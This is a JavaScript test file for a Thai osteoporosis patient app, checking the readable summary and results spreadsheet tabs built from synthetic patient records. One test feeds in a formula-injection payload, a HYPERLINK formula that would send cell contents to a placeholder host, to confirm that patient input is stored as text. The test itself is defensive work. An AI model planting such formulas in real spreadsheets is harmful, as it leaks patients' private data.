var path = require('path');
var core = require(path.join(__dirname, '..', 'app-core.js'));
var helpers = require('./helpers');
var fake = require('./fake_backend');

var SUMMARY = 'สรุปผู้ป่วย';
var RESULTS = 'ผลรายครั้ง';

function daysAgo(n) { return fake.bangkokDate(new Date(Date.now() - n * 86400000)); }

/** A synthetic patient on a phone of their own. Only made-up HNs (TEST-…) are used. */
function patient(b, hn, yob, sex) {
  var key = fake.deviceKey();
  var registered = b.post({
    token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: hn, hn: hn, yearOfBirth: yob,
    age: new Date().getUTCFullYear() - yob, sex: sex, consent: true, consentVersion: core.PDPA_NOTICE_VERSION,
    consentAt: new Date().toISOString(), consentLang: 'th', deviceKey: key
  });
  return {
    registered: registered,
    send: function (record) {
      var r = b.post(Object.assign({ token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: hn, deviceKey: key }, record));
      if (!r.ok) throw new Error(record.type + ' refused: ' + r.error);
      return r;
    }
  };
}

/** A readable tab as text: the title row, the header row, then one array per row. */
function tab(b, name) {
  return b.sheets[name].rows.map(function (r) {
    return r.map(function (c) { return c.formula ? 'FORMULA ' + c.formula : String(c.text !== undefined ? c.text : c.value); });
  });
}

function summaryRow(b, hn) {
  var rows = tab(b, SUMMARY);
  var header = rows[1];
  var row = rows.filter(function (r) { return r[0] === hn; })[0];
  helpers.assert(row, hn + ' has no summary row');
  var out = {};
  header.forEach(function (h, i) { out[h.split('\n')[1] || h] = row[i]; });
  return out;
}

function recordSnapshot(b) {
  var out = {};
  Object.keys(b.sheets).forEach(function (name) {
    if (name !== SUMMARY && name !== RESULTS) out[name] = JSON.stringify(b.sheets[name].rows);
  });
  return JSON.stringify(out);
}

function run() {
  var cases = [];

  cases.push({
    name: "the sheet uses the app's own words and cut-offs",
    fn: function () {
      var ctx = fake.backend().ctx;
      var R = ctx.READABLE;
      var C = core.CONTENT;
      var cap = function (s) { return s.charAt(0).toUpperCase() + s.slice(1); };
      var thaiPart = function (s) { return s.replace(/ \([^)]*\)$/, ''); };
      core.BONE_STATUSES.forEach(function (s) {
        helpers.assertEqual(thaiPart(R.boneStatus[s]), C['boneStatus' + cap(s) + '_name'].th, 'bone status ' + s);
      });
      core.FALL_RISKS.forEach(function (s) {
        helpers.assertEqual(R.fallRisk[s], C['fallRisk' + cap(s) + '_name'].th, 'fall risk ' + s);
      });
      [1, 2, 3].forEach(function (n) { helpers.assertEqual(R.balanceLevel[n], C['balanceLevel' + n].th, 'balance level ' + n); });
      core.MEDICATIONS.forEach(function (id) {
        var cls = core.MED_CLASSES.filter(function (m) { return m.id === (core.MED_ID_MIGRATION[id] ? core.MED_ID_MIGRATION[id].classId : id); })[0];
        helpers.assertEqual(R.medication[id], cls.name.th + ' (' + cls.id + ')', 'medicine ' + id);
      });
      core.RECORD_SCHEMAS.frax.fields.tool.values.forEach(function (t) { helpers.assert(R.fraxTool[t], 'FRAX tool ' + t + ' has no wording'); });

      helpers.assertEqual(ctx.RESULT_RULES.tugSlowSeconds, core.TUG_THRESHOLD_SECONDS, 'TUG cut-off');
      helpers.assertEqual(ctx.RESULT_RULES.heightLossCm, core.HEIGHT_LOSS_FLAG_CM, 'height-loss cut-off');
      helpers.assertEqual(ctx.RESULT_RULES.safetyItems, core.SAFETY_ITEMS.length, 'home checklist length');
      for (var age = core.PATIENT_AGE.min; age <= core.PATIENT_AGE.max; age++) {
        ['female', 'male'].forEach(function (sex) {
          helpers.assertEqual(ctx.chairStandNormFor(age, sex), core.chairStandNorm(age, sex), 'chair-stand norm ' + sex + ' ' + age);
          helpers.assertEqual(ctx.calciumTargetFor(age, sex), core.calciumTargetMg(age, sex), 'calcium target ' + sex + ' ' + age);
        });
        [40, 55.5, 80].forEach(function (kg) {
          helpers.assertEqual(ctx.proteinTargetFor(kg, age), core.proteinTargetG(kg, age), 'protein target ' + kg + ' kg ' + age);
        });
      }
      helpers.assertEqual(ctx.thaiDate('2026-09-25'), '25 ก.ย. 2569', 'dates carry the Buddhist-era year');
    }
  });

  cases.push({
    name: 'each patient gets one row of current results in words, and each result one line, newest first',
    fn: function () {
      var b = fake.backend();
      var p = patient(b, 'TEST-0012345', 1950, 'female');
      helpers.assert(p.registered.ok, 'registers');
      p.send({ date: daysAgo(200), type: 'checkin', heightCm: 158 });
      p.send({ date: daysAgo(2), type: 'checkin', heightCm: 157 });
      p.send({ date: daysAgo(2), type: 'checkin', heightCm: 156.5 }); // corrected the same day
      p.send({ date: daysAgo(1), type: 'checkin', falls: 0, missedDoses: 0, balanceLevel: 2, boneStatus: 'severeOsteoporosis', fallRisk: 'moderate' });
      p.send({ date: daysAgo(3), type: 'adherence', medication: 'bisphosphonate_weekly', doseNumber: 24 });
      p.send({ date: daysAgo(40), type: 'bmd', scanDate: daysAgo(45), spineT: -2.8, hipT: -2.1, lowestT: -2.8, boneStatus: 'osteoporosis' });
      p.send({ date: daysAgo(40), type: 'frax', tool: 'FRAX-official', weightKg: 50, heightCm: 156, bmi: 20.5, majorFractureRisk: 18, hipFractureRisk: 4.5 });
      p.send({ date: daysAgo(5), type: 'nutrition', calciumIntakeMg: 650, calciumSupplementMg: 500, vitaminDSupplementIu: 1000, proteinIntakeG: 52 });
      b.ctx.refreshPatientResults();

      var s = summaryRow(b, 'TEST-0012345');
      helpers.assertEqual(s['Age · sex'], (Number(fake.bangkokDate(new Date()).slice(0, 4)) - 1950) + ' ปี · หญิง');
      helpers.assertEqual(s['Bone condition'], 'กระดูกพรุนที่เคยหักแล้ว (severe osteoporosis)', 'the newest bone status wins');
      helpers.assert(/^156\.5 ซม\. · .* \(ลดลง 1\.5 ซม\. จาก /.test(s.Height), 'current height and change: ' + s.Height);
      helpers.assert(/^T-score กระดูกสันหลัง -2\.8 · สะโพก -2\.1 \(ตรวจ /.test(s['Latest BMD']), s['Latest BMD']);
      helpers.assert(/^กระดูกหักสำคัญ 18% · สะโพกหัก 4\.5% \(จากเว็บไซต์ FRAX\)/.test(s.FRAX), s.FRAX);
      helpers.assert(/^ยาเม็ดอะเลนโดรเนต \(alendronate\) ครั้งที่ 24 · /.test(s['Latest dose']), s['Latest dose']);
      helpers.assert(/^แคลเซียมจากอาหาร ~650 มก\.\/วัน \(เป้า 1,200\) · แอปแนะนำแคลเซียมเสริม 500 มก\.\/วัน/.test(s.Nutrition), s.Nutrition);
      helpers.assertEqual(s['Falls, 12 months'], 'ไม่มี');
      helpers.assertEqual(s['Needs attention'], '', 'nothing crosses a cut-off');

      var results = tab(b, RESULTS).slice(2);
      var dates = results.map(function (r) { return r[0]; });
      helpers.assertEqual(results.length, 8, 'one line per current result, the registration included');
      helpers.assertEqual(results[results.length - 1][3], 'ส่วนสูง 158 ซม.', 'the oldest is last');
      var corrected = results.filter(function (r) { return /^ส่วนสูง 156\.5 ซม\.$/.test(r[3]); });
      helpers.assertEqual(corrected.length, 1, 'a corrected day shows once, at its current value');
      helpers.assert(/^แก้ไขแล้ว 1 ครั้ง/.test(corrected[0][4]), 'and says it was corrected');
      helpers.assert(!results.some(function (r) { return r[3] === 'ส่วนสูง 157 ซม.'; }), 'the superseded value is not shown');
      helpers.assert(dates.length && tab(b, RESULTS)[1][0] === 'วันที่\nDate', 'headers are Thai and English');

      // No codes reach the readable tabs.
      var text = JSON.stringify(tab(b, SUMMARY)) + JSON.stringify(tab(b, RESULTS));
      ['severeOsteoporosis', 'bisphosphonate_weekly', 'FRAX-official', 'credentialId', '"moderate"'].forEach(function (code) {
        helpers.assert(text.indexOf(code) === -1, code + ' shown as a code');
      });
    }
  });

  cases.push({
    name: "'needs attention' follows the app's cut-offs exactly",
    fn: function () {
      var b = fake.backend();
      var year = Number(fake.bangkokDate(new Date()).slice(0, 4));
      var over = patient(b, 'TEST-OVER', year - 72, 'female');     // norm 10 stands
      var under = patient(b, 'TEST-UNDER', year - 72, 'female');
      over.send({ date: daysAgo(100), type: 'checkin', heightCm: 160 });
      over.send({ date: daysAgo(2), type: 'checkin', heightCm: 158, tugSeconds: 12, chairStandReps: 9, missedDoses: 1 });
      over.send({ date: daysAgo(30), type: 'falls', injured: 1, cause: 'ลื่น' });
      over.send({ date: daysAgo(20), type: 'falls', injured: 0 });
      under.send({ date: daysAgo(100), type: 'checkin', heightCm: 160 });
      under.send({ date: daysAgo(2), type: 'checkin', heightCm: 158.1, tugSeconds: 11.9, chairStandReps: 10, missedDoses: 0 });
      under.send({ date: daysAgo(400), type: 'falls', injured: 1 }); // more than a year ago
      b.ctx.refreshPatientResults();

      var flags = summaryRow(b, 'TEST-OVER')['Needs attention'];
      ['ล้มแล้วบาดเจ็บ', 'ล้ม 2 ครั้งใน 12 เดือน', 'ส่วนสูงลดลง 2 ซม.', 'ลุก-นั่งต่ำกว่าเกณฑ์', 'ลุกเดินจับเวลา 12 วินาทีขึ้นไป', 'ลืมยา'].forEach(function (f) {
        helpers.assert(flags.indexOf(f) !== -1, 'missing "' + f + '" in ' + flags);
      });
      var quiet = summaryRow(b, 'TEST-UNDER');
      helpers.assertEqual(quiet['Needs attention'], '', 'just inside every cut-off');
      helpers.assertEqual(quiet['Falls, 12 months'], 'ไม่มี', 'a fall over a year ago is not counted');
      helpers.assert(/\(ผ่านเกณฑ์ 10\)/.test(quiet['Chair stand']), quiet['Chair stand']);
      helpers.assert(/\(ปกติ\)/.test(quiet['Timed Up and Go']), quiet['Timed Up and Go']);
    }
  });

  cases.push({
    name: "a revoked phone's rows are left out, and another phone's rows are marked",
    fn: function () {
      var b = fake.backend();
      var own = patient(b, 'TEST-PHONES', 1950, 'female');
      own.send({ date: daysAgo(3), type: 'checkin', heightCm: 158 });
      var second = patient(b, 'TEST-PHONES', 1950, 'female'); // same details: accepted (option C)
      helpers.assert(second.registered.ok, 'second phone accepted');
      second.send({ date: daysAgo(2), type: 'checkin', heightCm: 150 });
      var stranger = patient(b, 'TEST-PHONES', 1990, 'male');  // wrong details: pending
      helpers.assert(!stranger.registered.ok, 'mismatch refused');
      b.ctx.refreshPatientResults();

      var s = summaryRow(b, 'TEST-PHONES');
      helpers.assert(/^150 ซม\./.test(s.Height), 'both active phones count: ' + s.Height);
      helpers.assertEqual(s.Phones, '2 เครื่อง (รอยืนยัน 1)');
      helpers.assert(s['Needs attention'].indexOf('มีโทรศัพท์รอยืนยันในแท็บ Devices') !== -1, 'the pending phone is flagged');
      var fromSecond = tab(b, RESULTS).slice(2).filter(function (r) { return r[3] === 'ส่วนสูง 150 ซม.'; })[0];
      helpers.assert(/จากโทรศัพท์เครื่องอื่นของผู้ป่วย/.test(fromSecond[4]), 'the second phone is named');

      // Staff revoke the second phone.
      var devices = b.sheets.Devices.rows;
      var cols = b.ctx.SHEET_COLUMNS.Devices;
      var rows = devices.filter(function (r) { return String(r[0].text || r[0].value) === 'TEST-PHONES' && String(r[cols.indexOf('status')].text) === 'active'; });
      rows[1][cols.indexOf('status')] = { text: 'revoked' };
      b.ctx.refreshPatientResults();
      s = summaryRow(b, 'TEST-PHONES');
      helpers.assert(/^158 ซม\./.test(s.Height), 'the revoked phone no longer counts: ' + s.Height);
      helpers.assert(!tab(b, RESULTS).some(function (r) { return r[3] === 'ส่วนสูง 150 ซม.'; }), 'nor is it listed');
    }
  });

  cases.push({
    name: 'nothing a patient typed can run as a formula in the readable tabs',
    fn: function () {
      var b = fake.backend();
      var p = patient(b, 'TEST-FORMULA', 1950, 'female');
      p.send({ date: daysAgo(1), type: 'falls', injured: 0, cause: '=HYPERLINK("https://example.invalid/?"&A3,"x")' });
      p.send({ date: daysAgo(1), type: 'bmd', scanDate: daysAgo(1), spineT: -3, lowestT: -3 });
      b.ctx.refreshPatientResults();
      [SUMMARY, RESULTS].forEach(function (name) {
        b.sheets[name].rows.forEach(function (r) {
          r.forEach(function (c) { helpers.assert(!c.formula, name + ' holds a formula: ' + c.formula); });
        });
      });
      helpers.assert(tab(b, RESULTS).some(function (r) { return r[3].indexOf('=HYPERLINK(') !== -1; }), 'the cause is shown, as text');
      // Every sentence starts with Thai text today; the guard is what keeps
      // it safe if one ever starts with a value.
      ['=1+1', '-2.8', '+66', '@x'].forEach(function (v) {
        helpers.assertEqual(b.ctx.readableCell(v), "'" + v, 'kept as text: ' + v);
      });
      helpers.assertEqual(b.ctx.readableCell('ไทย\nEnglish'), "'ไทย\nEnglish", 'a header keeps its line break');
    }
  });

  cases.push({
    name: 'rebuilding never touches the record tabs, and can run again and again',
    fn: function () {
      var b = fake.backend();
      var p = patient(b, 'TEST-REBUILD', 1950, 'female');
      p.send({ date: daysAgo(1), type: 'checkin', heightCm: 158 });
      var before = recordSnapshot(b);
      b.ctx.refreshPatientResults();
      b.ctx.refreshPatientResults();
      b.ctx.onOpen(); // no menu outside a spreadsheet window; the rebuild still runs
      helpers.assertEqual(recordSnapshot(b), before, 'record tabs changed');
      helpers.assert(!b.overwrites.some(function (o) { return o.indexOf(SUMMARY) !== 0 && o.indexOf(RESULTS) !== 0; }), 'a record row was overwritten');
      helpers.assertEqual(tab(b, SUMMARY).length, 3, 'title, header, one patient');
      helpers.assertEqual(tab(b, RESULTS).length, 4, 'title, header, registration and check-in');
      helpers.assert(b.sheets[SUMMARY].getFilter(), 'staff can filter and sort');
    }
  });

  cases.push({
    name: 'a tab left in an older layout is skipped, not moved or read wrongly',
    fn: function () {
      var b = fake.backend();
      var p = patient(b, 'TEST-LEGACY', 1950, 'female');
      p.send({ date: daysAgo(1), type: 'checkin', heightCm: 158 });
      var old = b.sheets.CheckIns;
      old.rows[0][2] = { text: 'height' }; // as an older script laid it out
      b.ctx.refreshPatientResults();
      helpers.assert(b.sheets.CheckIns === old, 'the tab was moved');
      helpers.assertEqual(summaryRow(b, 'TEST-LEGACY').Height, '', 'its rows are not read');
    }
  });

  return helpers.runSuite('t23_readable_results', cases);
}

module.exports = run;

if (require.main === module) {
  helpers.report(run());
}
